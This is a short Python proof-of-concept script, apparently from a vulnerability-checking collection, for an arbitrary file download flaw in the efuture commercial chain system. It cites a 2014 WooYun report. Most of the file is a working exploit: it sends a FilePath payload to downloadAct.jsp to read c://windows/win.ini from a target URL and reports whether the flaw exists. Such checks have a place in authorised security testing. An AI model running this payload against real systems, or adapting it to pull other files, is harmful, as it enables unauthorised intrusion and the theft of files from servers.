#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: efuture商业链系统任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2014-066881
author: Lucifer
description: web/login/downloadAct.jsp FilePath参数存在任意文件下载。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/web/login/downloadAct.jsp?FilePath=c://windows/win.ini&name=win.ini"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"support" in req.text and r"MPEGVideo" in req.text:
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
